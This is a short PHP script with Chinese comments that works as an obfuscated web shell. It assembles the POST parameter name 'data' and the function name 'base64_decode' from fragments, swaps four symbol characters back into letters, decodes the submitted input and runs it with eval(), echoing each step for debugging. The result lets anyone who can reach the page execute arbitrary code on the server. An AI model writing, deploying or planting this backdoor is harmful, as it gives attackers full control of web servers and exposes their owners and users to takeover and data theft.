<?php
// 调试模式，生产环境请关闭
error_reporting(E_ALL);
ini_set('display_errors', 1);

$func = $_POST;
$ac = 'a';
$pc = 'at';
$params = 'd' . $pc . $ac; // 结果是 'data'
if (isset($func[$params])) {
    $data = $func[$params];
    echo "接收到的数据: " . $data . "\n";

    $arr = array("|" => "a", "!" => "b", "@" => "c", "_" => "d",);
    $result = strtr($data, $arr);
    echo "替换后的数据: " . $result . "\n";

    $de2 = '32_de';
    $de = "base" . $de2 . "flag";
    $de = str_replace("32", "64", $de);
    $de = str_replace("flag", "code", $de);
    echo "使用的解码函数: " . $de . "\n";

    // 检查函数是否存在
    if (function_exists($de)) {
        $decoded = $de($result);
        echo "解码后的数据: " . $decoded . "\n";

        // 执行代码
        eval($decoded);
    } else {
        echo "错误：函数 $de 不存在。\n";
    }
} else {
    echo "错误：未找到参数 'data'。\n";
    echo "收到的POST参数：";
    print_r($func);
}
?>